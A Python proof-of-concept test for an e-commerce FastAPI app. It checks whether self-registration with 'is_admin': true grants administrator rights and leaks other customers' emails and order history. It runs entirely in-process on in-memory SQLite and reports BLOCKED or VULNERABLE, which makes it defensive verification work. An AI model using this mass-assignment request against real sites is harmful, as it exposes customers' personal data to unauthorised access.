"""Proof of concept: ECOM-01, privilege escalation via self-registration (CWE-269).

An anonymous caller sets "is_admin": true in the /auth/register body. The field is
carried from the request schema straight into the User model, so the account is
created with administrator rights. The attacker then reads every other customer's
email address and order history.

Runs entirely in-process against in-memory SQLite. No server, no Docker, no network.

    python security/poc/poc_privesc.py

Exit code 0 = the flaw is BLOCKED. Exit code 1 = the flaw is VULNERABLE.
"""
import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
os.environ.setdefault("SECRET_KEY", "poc-only-secret-not-a-real-key-0123456789abcdef")
os.environ.setdefault("DATABASE_URL", "sqlite:///:memory:")

from fastapi.testclient import TestClient          # noqa: E402
from sqlalchemy import create_engine               # noqa: E402
from sqlalchemy.orm import sessionmaker            # noqa: E402
from sqlalchemy.pool import StaticPool             # noqa: E402

from app.main import app                           # noqa: E402
from app.db.base import Base, get_db               # noqa: E402
from app.core.security import get_password_hash    # noqa: E402
from app.models.user import User                   # noqa: E402
from app.models.order import Order                 # noqa: E402

VICTIM_EMAIL = "victim.customer@example.com"
ATTACKER = {
    "email": "attacker@evil.example",
    "username": "attacker",
    "full_name": "Mallory",
    "password": "AttackerPassword123",
    "is_admin": True,          # <-- the entire attack
}


def build_client():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    session = Session()

    def override_get_db():
        yield session

    app.dependency_overrides[get_db] = override_get_db
    return TestClient(app), session


def seed_victim(session):
    """A legitimate customer who signed up before the attacker."""
    victim = User(
        email=VICTIM_EMAIL,
        username="victim",
        full_name="Real Customer",
        hashed_password=get_password_hash("VictimPassword123"),
        is_active=True,
        is_admin=False,
    )
    session.add(victim)
    session.commit()
    session.refresh(victim)
    session.add(Order(user_id=victim.id, total_amount=4207.55, status=None))
    session.commit()
    return victim


def main():
    client, session = build_client()
    victim = seed_victim(session)

    print("=" * 74)
    print("ECOM-01  Privilege escalation via self-registration  (CWE-269)")
    print("=" * 74)
    print(f"[setup] victim {VICTIM_EMAIL!r} exists with 1 order totalling 4207.55")
    print()

    # --- Request 1: anonymous registration asking for admin -----------------
    print('[1] POST /api/v1/auth/register  with  "is_admin": true   (no auth)')
    r = client.post("/api/v1/auth/register", json=ATTACKER)
    print(f"    -> HTTP {r.status_code}")

    if r.status_code == 422:
        print("    -> rejected: the schema forbids is_admin")
        print("\nVERDICT: BLOCKED")
        return 0
    if r.status_code != 201:
        print(f"    -> unexpected response: {r.text[:200]}")
        print("\nVERDICT: BLOCKED")
        return 0

    granted = r.json().get("is_admin")
    print(f"    -> account created, is_admin={granted}")
    if not granted:
        print("    -> the field was ignored, account is a normal user")
        print("\nVERDICT: BLOCKED")
        return 0

    # --- Request 2: log in ---------------------------------------------------
    print('[2] POST /api/v1/auth/login')
    r = client.post(
        "/api/v1/auth/login",
        data={"username": ATTACKER["username"], "password": ATTACKER["password"]},
    )
    token = r.json()["access_token"]
    auth = {"Authorization": f"Bearer {token}"}
    print(f"    -> HTTP {r.status_code}, bearer token acquired")

    # --- Request 3: read every order in the system ---------------------------
    print("[3] GET  /api/v1/orders/")
    r = client.get("/api/v1/orders/", headers=auth)
    print(f"    -> HTTP {r.status_code}, {len(r.json())} order(s) visible "
          f"(attacker created none)")

    # --- Request 4: the impact ----------------------------------------------
    print("[4] GET  /api/v1/orders/summary")
    r = client.get("/api/v1/orders/summary", headers=auth)
    rows = r.json()
    print(f"    -> HTTP {r.status_code}, {len(rows)} row(s)")
    print()
    print("    LEAKED CUSTOMER DATA:")
    for row in rows:
        print(f"      email={row['user_email']!r}  total={row['total_amount']}  "
              f"items={row['item_count']}")

    leaked = any(row["user_email"] == VICTIM_EMAIL for row in rows)
    print()
    print("-" * 74)
    if leaked:
        print("IMPACT: an anonymous internet user read another customer's email")
        print("        address and order history in 4 HTTP requests.")
        print()
        print("VERDICT: VULNERABLE")
        return 1

    print("VERDICT: BLOCKED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
